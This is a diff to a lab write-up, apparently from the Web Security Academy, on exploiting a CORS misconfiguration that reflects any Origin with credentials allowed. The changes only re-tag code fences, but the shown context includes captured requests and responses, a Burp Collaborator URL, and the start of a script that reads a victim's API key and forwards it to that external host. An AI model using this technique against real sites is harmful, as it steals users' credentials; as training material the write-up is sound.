@@ -5,7 +5,7 @@
 
 Log in with wiener:peter. Capture the request to /accountDetails.
 
-```
+```burp
 GET /accountDetails HTTP/2
 Host: 0a920072043b2f06800cd6c900df0072.web-security-academy.net
 Cookie: session=FTsYEKm2zZ9t0uAiyXaPTeeEQe88mxum
@@ -23,7 +23,7 @@ Te: trailers
 
 Response :
 
-```
+```burp
 HTTP/2 200 OK
 Access-Control-Allow-Credentials: true
 Content-Type: application/json; charset=utf-8
@@ -46,7 +46,7 @@ Add an arbitrary Origin header, e.g., Origin: google.com.
 
 Modified request:
 
-```
+```burp
 GET /accountDetails HTTP/2
 Host: 0a920072043b2f06800cd6c900df0072.web-security-academy.net
 Cookie: session=FTsYEKm2zZ9t0uAiyXaPTeeEQe88mxum
@@ -56,7 +56,7 @@ Origin: google.com
 
 Vulnerable response (origin reflected):
 
-```
+```burp
 HTTP/2 200 OK
 Access-Control-Allow-Origin: google.com
 Access-Control-Allow-Credentials: true
@@ -75,11 +75,11 @@ The server echoes any Origin and allows credentials → vulnerable.
 
 ### Step 3: Prepare exploit with Burp Collaborator
 
-Open Burp Collaborator client (Burp menu → Burp Collaborator client). Click “Copy to clipboard” to get a unique URL, e.g., https://mj95mdkxlvxoea49mqm5lfhc53buzqnf.oastify.com.
+Open Burp Collaborator client (Burp menu → Burp Collaborator client). Click “Copy to clipboard” to get a unique URL, e.g., `https://mj95mdkxlvxoea49mqm5lfhc53buzqnf.oastify.com`.
 
 Craft the exploit. It will send an authenticated XMLHttpRequest to /accountDetails from the victim’s browser and forward the API key to the Collaborator URL.
 
-```
+```js
 <script>
     var req = new XMLHttpRequest();
     req.onload = function() {
